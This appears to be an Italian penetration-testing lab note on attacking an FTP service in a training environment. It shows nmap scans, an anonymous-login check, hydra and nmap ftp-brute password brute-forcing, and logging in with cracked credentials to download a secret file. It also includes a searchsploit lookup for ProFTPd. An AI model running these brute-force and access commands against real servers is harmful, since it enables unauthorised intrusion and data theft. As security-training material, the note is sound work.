# Exploiting FTP

<figure><img src="../../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>

## Facciamo uno scan per vedere porte aperte e la versione dei servizi

<figure><img src="../../.gitbook/assets/image (912).png" alt=""><figcaption></figcaption></figure>

## Verifichiamo se l'accesso anonimo è abilitato

### Controlliamo tendando di connetterci via FTP

```
ftp 192.93.66.3 //e usiamo anonymous come username e lasciamo vuota la password
```

<figure><img src="../../.gitbook/assets/image (913).png" alt=""><figcaption></figcaption></figure>

### Verifichiamo anonymous access via NMAP script

```
ls -al /usr/share/nmap/scripts/ | grep ftp-*
nmap -sV 192.93.66.3 --script=ftp-anon
```

<figure><img src="../../.gitbook/assets/image (914).png" alt=""><figcaption></figcaption></figure>

## Bruteforce con hydra

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 ftp
```

<figure><img src="../../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>

### Tentiamo il login con le credenziali trovate

```
ftp 192.93.66.3 // e inseriamo le credenziali, ad es. di sysadmin
get secret.txt
exit
ls
cat secret.txt
```

<figure><img src="../../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>

## Exploit per la versione di ProFTP running sul target

Questa specifica versione di ProFTP potrebbe anche avere una serie di exploit disponibili, ed è possibile cercarli con il comando:&#x20;

`searchsploit ProFTPd`

<figure><img src="../../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>

In questo caso non c'è esattamente per la versione 1.3.5a

## Trovare una password di un utente con nmap script

Find the password of user “sysadmin” using nmap script.

```
echo "sysadmin" > users
nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local
```
